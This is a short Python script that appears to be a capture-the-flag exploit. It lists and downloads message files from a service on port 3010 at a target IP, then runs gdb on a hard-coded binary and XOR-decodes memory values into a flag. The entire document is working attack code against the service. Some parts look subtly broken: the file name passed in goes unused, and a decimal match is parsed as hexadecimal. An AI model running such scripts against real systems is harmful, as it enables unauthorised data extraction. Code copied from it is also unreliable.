#!/usr/bin/env python3

import requests,sys,re
import subprocess as sp
ip = sys.argv[1]

list_index = requests.get("http://%s:3010/list" %(ip))

refs = re.findall('message_id=([0-9A-Z]+)"',list_index.text)

print (refs)

def getflag(fname):
    res = sp.Popen("gdb -silent -x deb.txt U16QGE0M35RZ",shell=True,stdout=sp.PIPE)
    res = res.communicate()[0].decode()
    f1=re.findall(r'\$1 = (0x[0-9a-f]+)',res)[0]
    f2=re.findall(r'\$2 = ([0-9]+)',res)[0]
    f3=re.findall(r'\$3 = \{(.+)\}',res,re.DOTALL)[0]
    f3 = [i for i in map(lambda x: int(x,16),re.findall(r'([x0-9a-f]+)',f3))]

    sz = int(f2,16)
    key = int(f1,16)
    res = []
    f3=f3[0:14]
    for c in f3:
        res.append(chr((c ^ key) & 0xff))
    flag= "".join(res)
    return flag

for ref in refs:
    res = requests.get("http://%s:3010/get?message_id=%s" %(ip,ref),stream=True)
    if res.status_code == 200:
        with open(ref, 'wb') as f:
            for chunk in res:
                f.write(chunk)
        print(getflag(ref))
